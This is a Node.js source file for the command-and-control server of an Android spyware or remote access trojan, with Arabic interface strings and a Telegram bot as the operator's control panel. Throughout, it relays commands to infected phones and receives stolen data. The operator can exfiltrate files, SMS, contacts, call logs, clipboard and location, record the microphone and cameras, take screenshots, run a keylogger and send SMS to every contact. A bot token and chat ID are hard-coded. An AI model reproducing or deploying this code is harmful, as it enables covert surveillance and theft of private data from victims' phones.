const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const fs = require('fs');

// ==========================================
// ضع التوكن والـ ID بتاعك هنا 👇
const token = '8902375410:AAGETx0nYXZsIZ4IRRQOJdpTvmQ9Zj0dFF4';
const id = '7294984974';
const address = 'https://www.google.com';
// ==========================================

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer({ dest: 'uploadedFile/' });

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">السيرفر يعمل بنجاح</h1>');
});

app.get('/getFile/*', function (req, res) {
    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
    fs.stat(filePath, function(err, stat) {
        if (err == null) {
            res.sendFile(filePath);
        } else if (err.code === 'ENOENT') {
            res.send(`<h1>الملف غير موجود</h1>`);
        } else {
            res.send(`<h1>خطأ، غير موجود</h1>`);
        }
    });
});

app.get('/deleteFile/*', function (req, res) {
    const fileName = req.params[0];
    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
    fs.stat(filePath, function(err, stat) {
        if (err == null) {
            fs.unlink(filePath, (err) => {
                if (err) {
                    res.send(`<h1>الملف "${fileName}" لم يتم حذفه</h1>`);
                } else {
                    res.send(`<h1>الملف "${fileName}" تم حذفه بنجاح</h1>`);
                }
            });
        } else if (err.code === 'ENOENT') {
            res.send(`<h1>الملف "${fileName}" غير موجود</h1>`);
        } else {
            res.send('<h1>خطأ آخر</h1>');
        }
    });
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    if (!req.file) return res.send('');
    const name = req.file.originalname;
    const file_name = req.file.filename;
    const host_url = req.protocol + '://' + req.get('host');
    fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' + encodeURIComponent(name), function(err) { 
        if (err) console.log('ERROR: ' + err);
    });
    appBot.sendMessage(id, `°• رسالة من جهاز <b>${req.headers.model}</b>\n\n اسم الملف: ` + name + ` \n رابط الملف: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n رابط الحذف: ` + host_url + `/deleteFile/` + encodeURIComponent(name), {parse_mode: "HTML", disable_web_page_preview: true});
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من جهاز <b>${req.headers.model}</b>\n\n` + req.body['text'], {
        parse_mode: "HTML", disable_web_page_preview: true,
        "reply_markup": { "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]], 'resize_keyboard': true }
    });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• موقع من جهاز <b>${req.headers.model}</b>`, {
        parse_mode: "HTML",
        "reply_markup": { "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]], 'resize_keyboard': true }
    });
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'غير معروف';
    const battery = req.headers.battery || 'غير معروف';
    const version = req.headers.version || 'غير معروف';
    const brightness = req.headers.brightness || 'غير معروف';
    const provider = req.headers.provider || 'غير معروف';

    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider });
    
    appBot.sendMessage(id, 
        `°• جهاز جديد متصل\n\n` +
        `• الموديل : <b>${model}</b>\n` +
        `• البطارية : <b>${battery}</b>\n` +
        `• إصدار الأندرويد : <b>${version}</b>\n` +
        `• سطوع الشاشة : <b>${brightness}</b>\n` +
        `• مزود الخدمة : <b>${provider}</b>`, {parse_mode: "HTML"}
    );
    
    ws.on('close', function () {
        appBot.sendMessage(id, 
            `°• جهاز قطع الاتصال\n\n` +
            `• الموديل : <b>${model}</b>`, {parse_mode: "HTML"}
        );
        appClients.delete(ws.uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('الرجاء الرد برقم الهاتف الذي تريد إرسال الرسالة إليه')) {
            currentNumber = message.text;
            appBot.sendMessage(id, '°• ممتاز، الآن أدخل الرسالة التي تريد إرسالها\n\n• لاحظ أن الرسالة لن ترسل إذا تجاوزت الحد المسموح.', {reply_markup: {force_reply: true}});
        }
        if (message.reply_to_message.text.includes('ممتاز، الآن أدخل الرسالة')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`send_message:${currentNumber}/${message.text}`); }
            });
            currentNumber = ''; currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل الرسالة التي تريد إرسالها لجميع جهات الاتصال')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`send_message_to_all:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل الرابط الذي تريد إرساله')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`open_target_link:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل النص الذي تريد نطقه')) {
            const tts_link = 'https://translate.google.com/translate_tts?ie=UTF-8&tl=ar&client=t&q=' + encodeURIComponent(message.text);
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`text_to_speech:${tts_link}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل مسار الملف الذي تريد تحميله')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`file:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل مسار الملف الذي تريد حذفه')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`delete_file:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل المايكrophone لها')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`microphone:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الأمامية لها')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`rec_camera_main:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل المدة التي تريد تسجيل الكاميرا الخلفية لها')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`rec_camera_selfie:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل الرسالة التي تريد أن تظهر على جهاز الضحية')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`toast:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل الرسالة التي تريد أن تظهر كإشعار')) {
            currentTitle = message.text;
            appBot.sendMessage(id, '°• ممتاز، الآن أدخل الرابط الذي تريد فتحه عند الضغط على الإشعار', {reply_markup: {force_reply: true}});
        }
        if (message.reply_to_message.text.includes('ممتاز، الآن أدخل الرابط الذي تريد فتحه')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`show_notification:${currentTitle}/${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
        if (message.reply_to_message.text.includes('أدخل رابط الصوت الذي تريد تشغيله')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) { ws.send(`play_audio:${message.text}`); }
            });
            currentUuid = '';
            appBot.sendMessage(id, '°• طلبك قيد التنفيذ\n\n• ستتلقى رداً في اللحظات القادمة.');
        }
    }

    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحباً بك في لوحة التحكم\n\n' +
                '• إذا تم تثبيت التطبيق على الجهاز المستهدف، انتظر الاتصال.\n' +
                '• عند استلام رسالة الاتصال، فهذا يعني أن الجهاز جاهز لاستقبال الأوامر.\n' +
                '• اضغط على زر الأوامر واختر الجهاز ثم الأمر المطلوب.\n\n' +
                '• لإعادة التشغيل أرسل /start',
                { parse_mode: "HTML", disable_web_page_preview: true,
                  "reply_markup": { "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]], 'resize_keyboard': true } }
            );
        }
        if (message.text == 'الأجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• لا توجد أجهزة متصلة\n\n• تأكد من تثبيت التطبيق على جهاز الضحية.');
            } else {
                let text = '°• قائمة الأجهزة المتصلة:\n\n';
                appClients.forEach(function (value, key) {
                    text += `• الموديل : <b>${value.model}</b>\n• البطارية : <b>${value.battery}</b>\n• الأندرويد : <b>${value.version}</b>\n\n`;
                });
                appBot.sendMessage(id, text, {parse_mode: "HTML"});
            }
        }
        if (message.text == 'تنفيذ أمر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• لا توجد أجهزة متصلة.');
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key) {
                    deviceListKeyboard.push([{ text: value.model, callback_data: 'device:' + key }]);
                });
                appBot.sendMessage(id, '°• اختر الجهاز لتنفيذ الأمر:', { "reply_markup": { "inline_keyboard": deviceListKeyboard } });
            }
        }
    } else {
        appBot.sendMessage(id, '°• تم رفض الإذن');
    }
});

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];
    
    if (commend == 'device') {
        appBot.editMessageText(`°• اختر الأمر للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000, chat_id: id, message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{text: 'التطبيقات', callback_data: `apps:${uuid}`}, {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}],
                    [{text: 'سحب ملف', callback_data: `file:${uuid}`}, {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}],
                    [{text: 'الحافظة', callback_data: `clipboard:${uuid}`}, {text: 'المايكروفون', callback_data: `microphone:${uuid}`}],
                    [{text: 'الكاميرا الأمامية', callback_data: `camera_main:${uuid}`}, {text: 'الكاميرا الخلفية', callback_data: `camera_selfie:${uuid}`}],
                    [{text: 'تسجيل كاميرا أمامية', callback_data: `rec_camera_main:${uuid}`}, {text: 'تسجيل كاميرا خلفية', callback_data: `rec_camera_selfie:${uuid}`}],
                    [{text: 'الموقع', callback_data: `location:${uuid}`}, {text: 'رسالة منبثقة (Toast)', callback_data: `toast:${uuid}`}],
                    [{text: 'المكالمات', callback_data: `calls:${uuid}`}, {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`}],
                    [{text: 'اهتزاز', callback_data: `vibrate:${uuid}`}, {text: 'إظهار إشعار', callback_data: `show_notification:${uuid}`}],
                    [{text: 'الرسائل', callback_data: `messages:${uuid}`}, {text: 'إرسال رسالة', callback_data: `send_message:${uuid}`}],
                    [{text: 'تشغيل صوت', callback_data: `play_audio:${uuid}`}, {text: 'إيقاف الصوت', callback_data: `stop_audio:${uuid}`}],
                    [{text: '🔥', callback_data: `my_fire_emoji:${uuid}`}, {text: 'لقطة شاشة', callback_data: `screenshot:${uuid}`}],
                    [{text: 'تشغيل الفلاش', callback_data: `torch_on:${uuid}`}, {text: 'إطفاء الفلاش', callback_data: `torch_off:${uuid}`}],
                    [{text: 'تشغيل الكيلوجر', callback_data: `keylogger_on:${uuid}`}, {text: 'إطفاء الكيلوجر', callback_data: `keylogger_off:${uuid}`}],
                    [{text: 'فتح رابط', callback_data: `open_target_link:${uuid}`}, {text: 'نص إلى كلام', callback_data: `text_to_speech:${uuid}`}],
                    [{text: 'إرسال رسالة للكل', callback_data: `send_message_to_all:${uuid}`}],
                    [{text: 'أزرار الجهاز', callback_data: `device_button:${uuid}`}]
                ]
            }, parse_mode: "HTML"
        });
    }
    if (commend == 'calls') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('calls'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'contacts') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('contacts'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'messages') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('messages'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'apps') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('apps'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'device_info') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('device_info'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'clipboard') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('clipboard'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'camera_main') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('camera_main'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'camera_selfie') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('camera_selfie'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'location') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('location'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'vibrate') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('vibrate'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'stop_audio') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('stop_audio'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'torch_on') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('torch_on'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'torch_off') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('torch_off'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'keylogger_on') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('keylogger_on'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'keylogger_off') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('keylogger_off'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    if (commend == 'screenshot') { appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('screenshot'); }); appBot.deleteMessage(id, msg.message_id); appBot.sendMessage(id, '°• طلبك قيد التنفيذ...'); }
    
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• الرجاء الرد برقم الهاتف الذي تريد إرسال الرسالة إليه\n\n• إذا كان الرقم محلياً أدخله مع الصفر، وإلا أدخله مع رمز الدولة.', {reply_markup: {force_reply: true}});
        currentUuid = uuid;
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل الرسالة التي تريد إرسالها لجميع جهات الاتصال', {reply_markup: {force_reply: true}});
        currentUuid = uuid;
    }
    if (commend == 'open_target_link') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل الرابط الذي تريد إرساله', {reply_markup: {force_reply: true}});
        currentUuid = uuid;
    }
    if (commend == 'text_to_speech') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل النص الذي تريد نطقه', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'my_fire_emoji') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '🔥🔥🔥', {reply_markup: {force_reply: false}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'device_button') {
        currentUuid = uuid;
        appBot.editMessageText(`°• أزرار الجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000, chat_id: id, message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{text: '|||', callback_data: `device_btn_:${currentUuid}:recent`}, {text: '■', callback_data: `device_btn_:${currentUuid}:home`}, {text: '<', callback_data: `device_btn_:${currentUuid}:back`}],
                    [{text: 'Vol +', callback_data: `device_btn_:${currentUuid}:vol_up`}, {text: 'Vol -', callback_data: `device_btn_:${currentUuid}:vol_down`}, {text: '⊙', callback_data: `device_btn_:${currentUuid}:power`}],
                    [{text: 'خروج 🔙', callback_data: `device_btn_:${currentUuid}:exit`}]
                ]
            }, parse_mode: "HTML"
        });
    }
    if (commend == 'device_btn_') {
        switch (data.split(':')[2]) {
            case 'recent': appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('btn_recent'); }); break;
            case 'home': appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('btn_home'); }); break;
            case 'back': appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('btn_back'); }); break;
            case 'vol_up': appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('btn_vol_up'); }); break;
            case 'vol_down': appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('btn_vol_down'); }); break;
            case 'power': appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send('btn_power'); }); break;
            case 'exit': appBot.deleteMessage(id, msg.message_id); break;
        } 
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل مسار الملف الذي تريد تحميله\n\n• على سبيل المثال: DCIM/Camera', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل مسار الملف الذي تريد حذفه\n\n• على سبيل المثال: DCIM/Camera', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل المدة التي تريد تسجيل المايكrophone لها\n\n• أدخل الوقت بالثواني.', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'rec_camera_selfie') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل المدة التي تريد تسجيل الكاميرا الخلفية لها\n\n• أدخل الوقت بالثواني.', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'rec_camera_main') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل المدة التي تريد تسجيل الكاميرا الأمامية لها\n\n• أدخل الوقت بالثواني.', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل الرسالة التي تريد أن تظهر على جهاز الضحية', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل الرسالة التي تريد أن تظهر كإشعار', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• أدخل رابط الصوت الذي تريد تشغيله', {reply_markup: {force_reply: true}, parse_mode: "HTML"});
        currentUuid = uuid;
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    try { axios.get(address).catch(e => {}); } catch (e) {}
}, 5000);

appServer.listen(process.env.PORT || 8999);
